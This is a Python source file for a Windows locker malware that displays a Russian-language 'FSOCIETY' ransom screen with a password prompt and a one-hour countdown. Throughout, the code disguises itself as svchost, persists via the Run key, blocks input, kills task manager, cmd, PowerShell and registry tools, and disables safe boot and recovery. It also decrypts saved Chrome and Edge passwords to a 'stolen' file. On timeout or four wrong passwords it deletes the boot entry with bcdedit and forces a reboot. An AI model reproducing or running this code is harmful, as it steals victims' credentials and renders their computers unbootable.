import subprocess, sys, os, time, threading, tempfile, tkinter as tk, urllib.request, socket, re, json, shutil, winreg, ctypes, smtplib, base64, random, sqlite3
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import cv2, numpy as np
try:
    import pygame
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import pygame
try:
    import keyboard
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import keyboard
try:
    import win32crypt
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import win32crypt

PASSWORD = "1601"
MAX_ATTEMPTS = 4
TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Windows", "timer.dat")

attempts_left = MAX_ATTEMPTS

def protect_process():
    try:
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except:
        pass

def hide_process():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass

def disable_win_key():
    try:
        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(k)
            except:
                pass
    except:
        pass
    try:
        keyboard.block_key('windows')
        keyboard.block_key('left windows')
        keyboard.block_key('right windows')
    except:
        pass

def kill_taskmgr_ultimate():
    while True:
        try:
            for p in ["taskmgr.exe", "cmd.exe", "powershell.exe", "msconfig.exe", "regedit.exe", "procexp.exe", "procmon.exe"]:
                os.system(f"taskkill /f /im {p} >nul 2>&1")
        except:
            pass
        time.sleep(0.1)

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw_path}" "{cp}"')
        winreg.CloseKey(k)
    except:
        pass

def block_safe_mode():
    try:
        os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")
        os.system("bcdedit /set {current} recoveryenabled no >nul 2>&1")
    except:
        pass

def get_timer():
    try:
        if os.path.exists(TIMER_FILE):
            with open(TIMER_FILE, 'r') as f:
                return float(f.read().strip())
    except:
        pass
    end_time = time.time() + 3600
    try:
        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
        with open(TIMER_FILE, 'w') as f:
            f.write(str(end_time))
    except:
        pass
    return end_time

def timer_check_loop():
    while True:
        try:
            if get_timer() - time.time() <= 0:
                destroy_windows_forever()
        except:
            pass
        time.sleep(5)

def destroy_windows_forever():
    try:
        os.system("bcdedit /delete {current} /f >nul 2>&1")
        os.system("shutdown /r /t 0 /f >nul 2>&1")
    except:
        pass
    os._exit(0)

def block_everything():
    try:
        ctypes.windll.user32.BlockInput(True)
    except:
        pass
    try:
        keyboard.block_key('alt')
        keyboard.block_key('ctrl')
        keyboard.block_key('shift')
        keyboard.block_key('tab')
        keyboard.block_key('esc')
        keyboard.block_key('delete')
    except:
        pass

def unblock_all():
    try:
        ctypes.windll.user32.BlockInput(False)
    except:
        pass
    try:
        keyboard.unhook_all()
    except:
        pass

def mega_steal():
    report = []
    report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    try:
        report.append(f"IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
    except:
        pass
    try:
        report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except:
        pass
    try:
        for browser, path in [
            ("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
            ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))
        ]:
            if os.path.exists(path):
                report.append(f"\n=== {browser} ===")
                try:
                    db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
                    shutil.copy2(path, db)
                    cur = sqlite3.connect(db).cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, user, pw in cur:
                        try:
                            pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8', 'ignore')
                            report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
                        except:
                            pass
                    cur.close()
                    os.remove(db)
                except:
                    pass
    except:
        pass
    text = '\n'.join(report)
    try:
        os.makedirs(os.path.join(tempfile.gettempdir(), "stolen"), exist_ok=True)
        with open(os.path.join(tempfile.gettempdir(), "stolen", "report.txt"), 'w', encoding='utf-8') as f:
            f.write(text)
    except:
        pass

class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.bind("<Alt-F4>", lambda e: None)
        
        global attempts_left
        
        self.timer_end = get_timer()
        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
        self.update_timer()
        
        try:
            pygame.mixer.init()
            # Скачиваем музыку если есть интернет
            try:
                mp3_path = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
                if not os.path.exists(mp3_path):
                    urllib.request.urlretrieve("https://github.com/ippo123459-bit/windows-update-helper/raw/refs/heads/main/Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc)(1).mp3", mp3_path)
                pygame.mixer.music.load(mp3_path)
                pygame.mixer.music.play(-1)
            except:
                pass
        except:
            pass
        
        msg = f"""FSOCIETY
       
ТВОИ ДАННЫЕ УКРАДЕНЫ.
ПАРОЛИ, ЛОГИНЫ, COOKIES — ВСЁ У НАС.

ПОПЫТОК: {MAX_ATTEMPTS}
ВРЕМЯ: 1 ЧАС"""

        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier', 10, 'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
        
        cf = tk.Frame(self.win, bg='black')
        cf.place(relx=0.5, rely=0.8, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0, 5))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0, 5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check)
        self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0:
            destroy_windows_forever()
        h = int(remaining // 3600)
        m = int((remaining % 3600) // 60)
        s = int(remaining % 60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)
    
    def _keep(self):
        try:
            self.win.focus_force()
            self.pw.focus_force()
            self.win.after(100, self._keep)
        except:
            pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            try:
                pygame.mixer.music.stop()
            except:
                pass
            unblock_all()
            self.sl.config(text="ВЕРНО!", fg='white')
            self.win.update()
            try:
                os.remove(TIMER_FILE)
            except:
                pass
            time.sleep(1)
            self.root.destroy()
            os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0:
                self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                try:
                    pygame.mixer.music.stop()
                except:
                    pass
                self.sl.config(text="404 | ОШИБКА", fg='white')
                self.win.update()
                time.sleep(2)
                destroy_windows_forever()
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    protect_process()
    disable_win_key()
    hide_process()
    threading.Thread(target=kill_taskmgr_ultimate, daemon=True).start()
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    block_safe_mode()
    threading.Thread(target=timer_check_loop, daemon=True).start()
    block_everything()
    WinLocker()
    tk.mainloop()
